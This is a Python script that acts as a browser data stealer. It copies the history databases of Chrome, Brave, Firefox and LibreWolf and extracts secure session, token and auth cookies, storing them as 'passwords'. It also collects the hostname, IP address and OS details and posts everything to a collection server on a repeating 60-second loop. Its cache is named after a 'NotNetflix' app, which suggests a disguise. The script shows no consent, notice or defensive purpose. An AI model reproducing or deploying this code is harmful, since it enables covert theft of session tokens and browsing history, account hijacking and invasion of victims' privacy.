import os
import sys
import json
import time
import uuid
import shutil
import psutil
import sqlite3
import tempfile
import requests
import platform
import threading
import hashlib
from datetime import datetime, timedelta
from threading import Thread
from base64 import b64decode
from Crypto.Cipher import AES
import browser_cookie3

# ========== CONFIG ==========
SERVER_URL = "http://localhost:5000"
INTERVAL = 60
if platform.system() == "Windows":
    MACHINE_ID_FILE = os.path.join(os.getenv("APPDATA"), "machine", "id")
else:
    MACHINE_ID_FILE = os.path.expanduser("~/.machine_id")

if platform.system() == "Windows":
    CACHE_PATH = os.path.join(os.getenv("APPDATA"), "NotNetflix", "sent.json")
else:
    CACHE_PATH = os.path.expanduser("~/.cache/not_netflix_sent.json")

# ========== DEDUPLICATION CACHE ==========
def load_sent_cache():
    try:
        with open(CACHE_PATH, "r") as f:
            return set(json.load(f))
    except:
        return set()

def save_sent_cache(cache_set):
    os.makedirs(os.path.dirname(CACHE_PATH), exist_ok=True)
    with open(CACHE_PATH, "w") as f:
        json.dump(list(cache_set), f)


# ========== IDENTIFIER ==========
def get_machine_id():
    if os.path.exists(MACHINE_ID_FILE):
        return open(MACHINE_ID_FILE).read().strip()
    mid = str(uuid.uuid4())
    with open(MACHINE_ID_FILE, "w") as f:
        f.write(mid)
    return mid

MACHINE_ID = get_machine_id()

# ========== TIMESTAMP UTILS ==========
def chrome_ts(ts): return (datetime(1601, 1, 1) + timedelta(microseconds=ts)).isoformat()
def firefox_ts(ts): return datetime.fromtimestamp(ts / 1_000_000).isoformat()

# ========== SQLITE HISTORY ==========
def extract_history_from_sqlite(path, query, parse_row_fn):
    import shutil

    if not os.path.exists(path):
        print(f"[WARN] File not found: {path}")
        return []

    with tempfile.NamedTemporaryFile(delete=False) as tmp:
        temp_path = tmp.name

    try:
        # Copy main db file
        shutil.copy2(path, temp_path)

        # Copy auxiliary files if they exist (important!)
        for ext in ["-wal", "-shm"]:
            src = path + ext
            dst = temp_path + ext
            if os.path.exists(src):
                shutil.copy2(src, dst)

        # Open read-only via URI (needed for locked or corrupted DBs)
        conn = sqlite3.connect(f"file:{temp_path}?mode=ro", uri=True)
        cursor = conn.cursor()

        cursor.execute(query)
        rows = cursor.fetchall()
        conn.close()

        return [parse_row_fn(row) for row in rows]

    except Exception as e:
        print(f"[ERROR] Failed to extract from {path}: {e}")
        return []

    finally:
        for ext in ["", "-wal", "-shm"]:
            try:
                os.remove(temp_path + ext)
            except Exception:
                pass

def extract_history_generic(name, base_path, query, parser, file="places.sqlite"):
    if not os.path.exists(base_path):
        return []
    entries = []
    if os.path.isdir(base_path):
        profiles = [d for d in os.listdir(base_path) if os.path.isdir(os.path.join(base_path, d))]
        for profile in profiles:
            path = os.path.join(base_path, profile, file)
            if os.path.exists(path):
                extracted = extract_history_from_sqlite(path, query, parser)
                entries.extend(extracted)
    else:
        entries.extend(extract_history_from_sqlite(base_path, query, parser))
    return entries

    return extract_history_from_sqlite(full_path, query, parser)

# ========== HISTORY COLLECTION ==========
def get_browser_history():
    results = []
    system = platform.system()

    if system == "Linux":
        results += extract_history_generic("chrome", os.path.expanduser("~/.config/google-chrome/Default"),
            "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100",
            lambda r: {"url": r[0], "title": r[1], "visit_time": chrome_ts(r[2]), "browser_type": "chrome"}, file="History")
        results += extract_history_generic("brave", os.path.expanduser("~/.config/BraveSoftware/Brave-Browser/Default"),
            "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100",
            lambda r: {"url": r[0], "title": r[1], "visit_time": chrome_ts(r[2]), "browser_type": "brave"}, file="History")
        results += extract_history_generic("firefox", os.path.expanduser("~/.mozilla/firefox"),
            "SELECT url, title, last_visit_date FROM moz_places WHERE last_visit_date > 0 ORDER BY last_visit_date DESC LIMIT 100",
            lambda r: {"url": r[0], "title": r[1], "visit_time": firefox_ts(r[2]), "browser_type": "firefox"}, file="places.sqlite")
        results += extract_history_generic("librewolf", os.path.expanduser("~/.librewolf"),
            "SELECT url, title, last_visit_date FROM moz_places WHERE last_visit_date > 0 ORDER BY last_visit_date DESC LIMIT 100",
            lambda r: {"url": r[0], "title": r[1], "visit_time": firefox_ts(r[2]), "browser_type": "librewolf"}, file="places.sqlite")

    elif system == "Windows":
        local = os.getenv("LOCALAPPDATA", "")
        roam = os.getenv("APPDATA", "")
        print(f"[DEBUG] LOCALAPPDATA: {local}")
        print(f"[DEBUG] APPDATA: {roam}")

        # Chrome (Chromium, LOCALAPPDATA)
        results += extract_history_generic(
            "chrome",
            os.path.join(local, "Google\\Chrome\\User Data\\Default"),
            "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100",
            lambda r: {
                "url": r[0],
                "title": r[1],
                "visit_time": chrome_ts(r[2]),
                "browser_type": "chrome"
            },
            file="History"
        )

        # Brave (Chromium, LOCALAPPDATA)
        results += extract_history_generic(
            "brave",
            os.path.join(local, "BraveSoftware\\Brave-Browser\\User Data\\Default"),
            "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100",
            lambda r: {
                "url": r[0],
                "title": r[1],
                "visit_time": chrome_ts(r[2]),
                "browser_type": "brave"
            },
            file="History"
        )

        # Firefox (Gecko, APPDATA/Roaming)
        results += extract_history_generic(
            "firefox",
            os.path.join(roam, "Mozilla", "Firefox", "Profiles"),
            "SELECT url, title, last_visit_date FROM moz_places WHERE last_visit_date > 0 ORDER BY last_visit_date DESC LIMIT 100",
            lambda r: {
                "url": r[0],
                "title": r[1],
                "visit_time": firefox_ts(r[2]),
                "browser_type": "firefox"
            },
            file="places.sqlite"
        )

        # LibreWolf (Gecko fork, APPDATA/Roaming)
        results += extract_history_generic(
            "librewolf",
            os.path.join(roam, "LibreWolf", "Profiles"),
            "SELECT url, title, last_visit_date FROM moz_places WHERE last_visit_date > 0 ORDER BY last_visit_date DESC LIMIT 100",
            lambda r: {
                "url": r[0],
                "title": r[1],
                "visit_time": firefox_ts(r[2]),
                "browser_type": "librewolf"
            },
            file="places.sqlite"
        )
    return results

# ========== COOKIES/CREDENTIALS ==========
def get_saved_credentials():
    credentials = []
    sources = [
        ("chrome", browser_cookie3.chrome),
        ("brave", browser_cookie3.brave),
        ("firefox", browser_cookie3.firefox),
        ("librewolf", browser_cookie3.librewolf)
    ]
    keywords = {"session", "token", "auth"}
    for name, loader in sources:
        try:
            for cookie in loader():
                if cookie.secure and cookie.name.lower() in keywords:
                    credentials.append({
                        "website": cookie.domain,
                        "username": cookie.name,
                        "password": cookie.value,
                        "browser_type": name
                    })
        except Exception:
            continue
    return credentials

# ========== SYSTEM INFO ==========
def get_host_info():
    return {
        "machine_id": MACHINE_ID,
        "hostname": platform.node(),
        "ip_address": get_ip_address(),
        "os_info": platform.platform()
    }

def get_ip_address():
    for iface in psutil.net_if_addrs().values():
        for entry in iface:
            if entry.family.name == "AF_INET" and not entry.address.startswith("127."):
                return entry.address
    return "0.0.0.0"

# ========== Multiple Data Check ========
_sent_hashes = set()

def hash_entry(entry):
    return hashlib.sha256(repr(entry).encode()).hexdigest()

def is_duplicate(entry):
    h = hash_entry(entry)
    if h in _sent_hashes:
        return True
    _sent_hashes.add(h)
    return False

# ========== COMMUNICATION ==========
def send_data_once():
    try:
        cache = load_sent_cache()
        new_cache = set(cache)

        # === History ===
        history = get_browser_history()
        filtered_history = []
        for h in history:
            key = f"{h['url']}_{h['visit_time']}_{h['browser_type']}"
            h_hash = hashlib.sha256(key.encode()).hexdigest()
            if h_hash not in cache:
                filtered_history.append(h)
                new_cache.add(h_hash)

        if filtered_history:
            requests.post(f"{SERVER_URL}/submit/history", json={
                "machine_id": MACHINE_ID,
                "history": filtered_history
            }, timeout=10)

        # === Credentials ===
        credentials = get_saved_credentials()
        filtered_credentials = []
        for c in credentials:
            key = f"{c['website']}_{c['username']}_{c['browser_type']}"
            c_hash = hashlib.sha256(key.encode()).hexdigest()
            if c_hash not in cache:
                filtered_credentials.append(c)
                new_cache.add(c_hash)

        if filtered_credentials:
            requests.post(f"{SERVER_URL}/submit/credentials", json={
                "machine_id": MACHINE_ID,
                "credentials": filtered_credentials
            }, timeout=10)

        save_sent_cache(new_cache)

    except requests.RequestException:
        pass

# ========== RUNNER ==========
def main_loop():
    while True:
        send_data_once()
        time.sleep(INTERVAL)

def run_once():
    send_data_once()

if __name__ == "__main__":
    if "--loop" in sys.argv:
        main_loop()
    else:
        run_once()
